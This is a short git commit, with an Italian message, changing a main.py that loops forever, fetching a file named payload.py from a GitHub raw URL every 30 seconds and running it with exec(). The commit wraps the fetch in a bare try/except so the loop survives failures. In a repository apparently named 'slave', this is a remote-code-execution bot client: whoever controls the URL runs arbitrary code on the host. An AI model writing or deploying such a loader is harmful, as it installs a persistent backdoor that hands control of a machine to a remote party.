3b2d3efcb6011008d0b4eb5b4b385375b9998feb
liverfried <113541287+liverfried@users.noreply.github.com>
2022-11-08 15:54:11 +0100

    Introdotto try: ... except: ...
    Per evitare che il codice si chiuda se non apre il link

--- main.py
+++ main.py
@@ -1,9 +1,11 @@
-from gzip import READ
 from urllib.request import urlopen
 from time import sleep
 
 while True:
-    with urlopen('https://raw.githubusercontent.com/liverfried/slave/main/test_payload/payload.py') as payload:
-        exec(payload.read())
+    try:
+        with urlopen('https://raw.githubusercontent.com/liverfried/slave/main/payload.py') as payload:
+            exec(payload.read())
+    except:
+        ...
 
     sleep(30)
